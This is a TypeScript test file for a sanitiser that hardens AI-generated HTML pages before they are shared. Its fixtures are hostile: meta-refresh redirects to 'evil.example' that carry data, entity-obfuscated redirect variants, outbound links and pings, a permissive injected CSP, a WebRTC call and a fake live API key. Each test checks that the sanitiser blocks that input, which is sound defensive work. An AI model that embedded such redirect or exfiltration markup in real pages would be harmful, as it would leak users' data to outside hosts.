
import { beforeEach, describe, expect, it, vi } from "vitest";

const TENANT = "aaaaaaaa-aaaa-4aaa-aaaa-aaaaaaaaaaaa";
const RUN = "11111111-1111-4111-1111-111111111111";

const mocks = vi.hoisted(() => ({
  uploads: [] as Array<{ path: string; bytes: number }>,
  inserts: [] as Array<Record<string, unknown>>,
  guard: vi.fn(async () => "ok"),
}));

vi.mock("@/services/supabase", () => ({ serviceClient: vi.fn() }));
vi.mock("@/services/settings", () => ({ getBoolSetting: vi.fn() }));
vi.mock("@/services/reports/guard", () => ({ assertRunTenantOwnership: mocks.guard }));
vi.mock("@/services/tenant-client", () => ({
  asTenantId: (t: string) => t,
  tenantStorage: () => ({
    from: () => ({
      upload: async (path: string, body: Buffer) => {
        mocks.uploads.push({ path, bytes: body.length });
        return { error: null };
      },
    }),
  }),
  tenantClient: (tid: string) => ({
    from: () => ({
      insert: (row: Record<string, unknown>) => {
        const stamped = { ...row, tenant_id: tid, status: "private" };
        mocks.inserts.push(stamped);
        return { select: () => ({ single: async () => ({ data: stamped, error: null }) }) };
      },
    }),
  }),
}));

import { createSharedPage, hardenPageHtml, SHARED_PAGE_CSP, SHARED_PAGE_MAX_CHARS, WEBRTC_OFF_SCRIPT } from "../page";

describe("hardenPageHtml", () => {
  it("puts the CSP first, before any model markup", () => {
    const out = hardenPageHtml("<!DOCTYPE html><html><head><script>x()</script></head></html>");
    expect(out.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${SHARED_PAGE_CSP}">`)).toBe(true);
    expect(out.match(/<!doctype/gi)).toHaveLength(1);
    expect(out.indexOf("Content-Security-Policy")).toBeLessThan(out.indexOf("<script>"));
  });

  it("blocks every network call and only allows the two script CDNs", () => {
    expect(SHARED_PAGE_CSP).toContain("connect-src 'none'");
    expect(SHARED_PAGE_CSP).toContain("default-src 'none'");
    expect(SHARED_PAGE_CSP).toContain("form-action 'none'");
    const scriptSrc = SHARED_PAGE_CSP.split("; ").find((d) => d.startsWith("script-src"));
    expect(scriptSrc).toBe(
      "script-src 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net/npm/",
    );
  });

  it("removes meta refresh, the one navigation CSP cannot stop", () => {
    const out = hardenPageHtml(
      `<head><meta http-equiv="refresh" content="0;url=https://evil.example/?d=1"><meta http-equiv='Refresh' content='1'></head>`,
    );
    expect(out.toLowerCase()).not.toContain("refresh");
  });

  it("strips a meta refresh even with a > inside a quoted attribute or an entity", () => {
    for (const tag of [
      `<meta content="0;url=https://x.example/?d=SECRET>x" http-equiv="refresh">`,
      `<meta http-equiv='Refresh' content='0;url=https://x.example/'>`,
      `<meta http-equiv="&#114;efresh" content="0;url=https://x.example/">`,
      `<meta http-equiv="re&#x66;resh" content="0;url=https://x.example/">`,
    ]) {
      const out = hardenPageHtml(`${tag}<p>ok</p>`);
      expect(out).not.toContain("x.example");
      expect(out).toContain("<p>ok</p>");
    }
  });

  it("keeps in-page anchors and neutralises every other link target", () => {
    const out = hardenPageHtml(
      `<a href="#q3">Q3</a><a href="https://x.example/?d=1">src</a><a href='&#104;ttps://x.example'>e</a><form action="https://x.example"></form><a ping="https://x.example" href="#a">p</a>`,
    );
    expect(out).toContain('href="#q3"');
    expect(out).not.toContain("x.example");
  });

  it("leaves a Google Fonts stylesheet link alone", () => {
    const link = `<link href="https://fonts.googleapis.com/css2?family=Fraunces&display=swap" rel="stylesheet">`;
    expect(hardenPageHtml(link)).toContain(link);
  });

  it("drops a CSP the model wrote, leaving ours as the only policy", () => {
    const out = hardenPageHtml(`<head><meta http-equiv="Content-Security-Policy" content="default-src *"></head>`);
    expect(out.match(/Content-Security-Policy/g)).toHaveLength(1);
    expect(out).not.toContain("default-src *");
  });

  it("runs the WebRTC / frame blocker before any model script", () => {
    const out = hardenPageHtml("<script>new RTCPeerConnection()</script>");
    const blocker = out.indexOf(WEBRTC_OFF_SCRIPT);
    expect(blocker).toBeGreaterThan(out.indexOf("Content-Security-Policy"));
    expect(blocker).toBeLessThan(out.indexOf("new RTCPeerConnection"));
    expect(WEBRTC_OFF_SCRIPT).toContain("RTCPeerConnection");
    expect(WEBRTC_OFF_SCRIPT).toContain("MutationObserver");
    expect(WEBRTC_OFF_SCRIPT).toContain("attachShadow");
  });

  it("handles a page with no doctype or head", () => {
    const out = hardenPageHtml("<h1>Q3</h1>");
    expect(out.endsWith("<h1>Q3</h1>")).toBe(true);
  });
});

describe("createSharedPage", () => {
  beforeEach(() => {
    mocks.uploads.length = 0;
    mocks.inserts.length = 0;
    mocks.guard.mockClear();
  });

  it("saves a private page under <tenant>/<id>.html after the run guard", async () => {
    const row = await createSharedPage({ tenant_id: TENANT, run_id: RUN, title: "Q3 review", html: "<h1>Q3</h1>" });
    expect(mocks.guard).toHaveBeenCalledWith({ tenant_id: TENANT, run_id: RUN });
    expect(row.status).toBe("private");
    expect(row.tenant_id).toBe(TENANT);
    expect(mocks.uploads[0].path).toBe(`${TENANT}/${row.id}.html`);
    expect(row.storage_path).toBe(mocks.uploads[0].path);
  });

  it("refuses a page carrying a secret, before anything is stored", async () => {
    await expect(
      createSharedPage({
        tenant_id: TENANT,
        run_id: RUN,
        title: "Keys",
        html: `<p>sk_live_${"a".repeat(24)}</p>`,
      }),
    ).rejects.toMatchObject({ code: "leak_blocked" });
    expect(mocks.uploads).toHaveLength(0);
    expect(mocks.inserts).toHaveLength(0);
  });

  it("refuses an oversized page", async () => {
    await expect(
      createSharedPage({ tenant_id: TENANT, run_id: RUN, title: "Big", html: "x".repeat(SHARED_PAGE_MAX_CHARS + 1) }),
    ).rejects.toMatchObject({ code: "too_large" });
    expect(mocks.uploads).toHaveLength(0);
  });
});
